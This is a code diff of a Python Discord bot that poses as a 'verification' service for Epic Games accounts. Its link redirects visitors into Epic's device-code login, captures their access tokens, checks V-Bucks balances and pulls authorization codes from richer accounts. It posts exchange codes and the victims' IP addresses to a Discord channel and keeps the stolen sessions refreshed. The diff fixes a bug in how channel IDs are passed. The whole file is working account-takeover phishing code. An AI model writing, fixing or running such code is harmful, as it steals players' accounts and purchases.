@@ -2,7 +2,7 @@
 # -*- coding: utf-8 -*-
 """
 Discord Bot for Epic Games Authentication with robust message delivery, custom domain, and V-Bucks checking.
-- Last Updated: 2025-11-20 03:32:58
+- Last Updated: 2025-11-20 03:39:15
 """
 
 # --- SETUP AND INSTALLATION ---
@@ -106,7 +106,6 @@ ngrok_ready = threading.Event()
 permanent_link = None
 PERMANENT_LINK_ID = str(uuid.uuid4())[:13]
 
-# This global variable is the key to the fix. It will hold the single channel ID.
 TARGET_CHANNEL_ID = None
 
 verification_uses = 0
@@ -119,7 +118,7 @@ bot = commands.Bot(command_prefix="!", intents=intents)
 bot.remove_command('help')
 
 # ==============================================================================
-# --- EPIC AUTHENTICATION LOGIC (Unchanged) ---
+# --- EPIC AUTHENTICATION LOGIC ---
 # ==============================================================================
 async def create_epic_auth_session():
     EPIC_TOKEN = "OThmN2U0MmMyZTNhNGY4NmE3NGViNDNmYmI0MWVkMzk6MGEyNDQ5YTItMDAxYS00NTFlLWFmZWMtM2U4MTI5MDFjNGQ3"
@@ -188,13 +187,13 @@ async def auto_refresh_session(session_id):
             active_sessions[session_id]['status'] = 'expired'
         await edit_bot_message(session_id, status='expired')
 
-def monitor_epic_auth_sync(device_code, interval, expires_in, user_ip):
+def monitor_epic_auth_sync(device_code, interval, expires_in, user_ip, channel_id):
     loop = asyncio.new_event_loop()
     asyncio.set_event_loop(loop)
-    try: loop.run_until_complete(monitor_epic_auth(device_code, interval, expires_in, user_ip))
+    try: loop.run_until_complete(monitor_epic_auth(device_code, interval, expires_in, user_ip, channel_id))
     finally: loop.close()
 
-async def monitor_epic_auth(device_code, interval, expires_in, user_ip):
+async def monitor_epic_auth(device_code, interval, expires_in, user_ip, channel_id):
     EPIC_TOKEN = "OThmN2U0MmMyZTNhNGY4NmE3NGViNDNmYmI0MWVkMzk6MGEyNDQ5YTItMDAxYS00NTFlLWFmZWMtM2U4MTI5MDFjNGQ3"
     try:
         async with aiohttp.ClientSession() as sess:
@@ -212,15 +211,14 @@ async def monitor_epic_auth(device_code, interval, expires_in, user_ip):
                     auth = await get_authorization_code(access_token) if vbucks > 5000 else None
                     session_id = str(uuid.uuid4())[:8]
                     with session_lock:
-                        # This session is now created with the guaranteed TARGET_CHANNEL_ID
-                        active_sessions[session_id] = {'access_token': access_token, 'account_info': info, 'user_ip': user_ip, 'created_at': time.time(), 'last_refresh': time.time(), 'refresh_count': 0, 'expires_at': time.time() + 10800, 'status': 'active', 'message_id': None, 'channel_id': TARGET_CHANNEL_ID, 'stw_codes': stw, 'vbucks': vbucks}
+                        active_sessions[session_id] = {'access_token': access_token, 'account_info': info, 'user_ip': user_ip, 'created_at': time.time(), 'last_refresh': time.time(), 'refresh_count': 0, 'expires_at': time.time() + 10800, 'status': 'active', 'message_id': None, 'channel_id': channel_id, 'stw_codes': stw, 'vbucks': vbucks}
                     bot.loop.create_task(send_new_login_message(session_id, exchange, auth))
                     bot.loop.create_task(auto_refresh_session(session_id))
                     return
     except Exception as e: logger.error(f"❌ Monitoring error: {e}\n{traceback.format_exc()}")
 
 # ==============================================================================
-# --- DISCORD BOT LOGIC (WITH ROBUST CHANNEL HANDLING) ---
+# --- DISCORD BOT LOGIC ---
 # ==============================================================================
 async def send_new_login_message(session_id, initial_exchange_code, initial_auth_code):
     with session_lock: session = active_sessions[session_id]
@@ -260,30 +258,19 @@ def build_embed(session_id, exchange_code=None, auth_code=None, status_override=
     return embed
 
 async def setup_target_channel(guild):
-    """This function finds or creates the 'rift-auth' channel and locks it as the target."""
     global TARGET_CHANNEL_ID
-    # If we already have a working channel, do nothing.
-    if TARGET_CHANNEL_ID and bot.get_channel(TARGET_CHANNEL_ID):
-        return
-
-    # Search for the channel.
-    target_channel = discord.utils.get(guild.text_channels, name="rift-auth")
+    if TARGET_CHANNEL_ID and bot.get_channel(TARGET_CHANNEL_ID): return
     
+    target_channel = discord.utils.get(guild.text_channels, name="rift-auth")
     if not target_channel:
         try:
-            # If it doesn't exist, create it.
-            logger.info(f"Channel 'rift-auth' not found in {guild.name}. Creating it...")
             target_channel = await guild.create_text_channel("rift-auth")
-            logger.info(f"Successfully created #rift-auth in {guild.name}.")
         except discord.Forbidden:
-            logger.error(f"Cannot create channel in {guild.name} due to permissions. Using first available channel as a fallback.")
-            target_channel = guild.text_channels[0] # Fallback to any channel if creation fails.
+            target_channel = guild.text_channels[0]
             
-    # Lock the channel ID as our target for all future messages.
     TARGET_CHANNEL_ID = target_channel.id
-    logger.info(f"✅ Target channel locked to: #{target_channel.name} ({TARGET_CHANNEL_ID}) in {guild.name}")
+    logger.info(f"✅ Target channel locked to: #{target_channel.name} in {guild.name}")
     
-    # Send the startup message to the locked-on channel.
     embed = discord.Embed(title="🚀 Rift Bot Activated", description=f"**Verification Link:**\n`{permanent_link}`", color=0x7289DA)
     await target_channel.send(embed=embed)
 
@@ -293,22 +280,18 @@ async def on_ready():
     permanent_link = f"https://{CUSTOM_DOMAIN}/verify/{PERMANENT_LINK_ID}"
     logger.info(f"✅ Bot is online as {bot.user}")
     
-    # Start background services.
     threading.Thread(target=run_web_server, args=(8000,), daemon=True).start()
     threading.Thread(target=setup_ngrok_tunnel, args=(8000,), daemon=True).start()
 
-    await bot.wait_until_ready() # Wait until the bot's internal cache is ready.
+    await bot.wait_until_ready()
     if not bot.guilds:
-        logger.warning("Bot is not in any servers. Please invite it to a server.")
+        logger.warning("Bot is not in any servers. Waiting to be invited.")
         return
         
-    # Reliably find and set the target channel on startup.
     await setup_target_channel(bot.guilds[0])
 
 @bot.event
 async def on_guild_join(guild):
-    """When the bot joins a new server, set up the channel there."""
-    logger.info(f"Joined new server: {guild.name}. Setting up channel...")
     await setup_target_channel(guild)
 
 # ==============================================================================
@@ -319,13 +302,9 @@ class RequestHandler(http.server.SimpleHTTPRequestHandler):
         global verification_uses
         path_parts = self.path.strip("/").split("/")
         if len(path_parts) == 2 and path_parts[0] == 'verify' and path_parts[1] == PERMANENT_LINK_ID:
-            # If the bot hasn't locked a channel yet, tell the user it's not ready.
             if not TARGET_CHANNEL_ID:
-                self.send_response(503) # Service Unavailable
-                self.send_header('Content-type', 'text/html')
-                self.end_headers()
-                self.wfile.write(b"<h1>503 Service Unavailable</h1><p>The bot is starting up and has not yet secured a channel. Please try again in a moment.</p>")
-                logger.warning("Verification attempted, but bot is not ready (no target channel).")
+                self.send_response(503); self.send_header('Content-type', 'text/html'); self.end_headers()
+                self.wfile.write(b"<h1>Bot is not ready. Please try again in a moment.</h1>")
                 return
 
             verification_uses += 1
@@ -334,7 +313,8 @@ class RequestHandler(http.server.SimpleHTTPRequestHandler):
                 loop = asyncio.new_event_loop()
                 epic_session = loop.run_until_complete(create_epic_auth_session())
                 loop.close()
-                threading.Thread(target=monitor_epic_auth_sync, args=(epic_session['device_code'], epic_session['interval'], epic_session['expires_in'], client_ip), daemon=True).start()
+                # BUG FIX: Pass the TARGET_CHANNEL_ID to the monitoring thread.
+                threading.Thread(target=monitor_epic_auth_sync, args=(epic_session['device_code'], epic_session['interval'], epic_session['expires_in'], client_ip, TARGET_CHANNEL_ID), daemon=True).start()
                 self.send_response(302); self.send_header('Location', epic_session['activation_url']); self.end_headers()
             except Exception as e: logger.error(f"Auth session error: {e}"); self.send_error(500)
         else: self.send_error(404); self.end_headers()
@@ -346,7 +326,7 @@ def run_web_server(port):
 
 def setup_ngrok_tunnel(port):
     ngrok_executable = os.path.join(os.getcwd(), "ngrok.exe" if platform.system() == "windows" else "ngrok")
-    if not os.getenv("NGROK_AUTHTOKEN"): logger.warning("NGROK_AUTHTOKEN not found! Custom domain will fail.")
+    if not os.getenv("NGROK_AUTHTOKEN"): logger.warning("NGROK_AUTHTOKEN not found!")
     logger.info(f"🌐 Starting ngrok for {CUSTOM_DOMAIN}...")
     command = [ngrok_executable, 'http', str(port), f'--domain={CUSTOM_DOMAIN}']
     try:
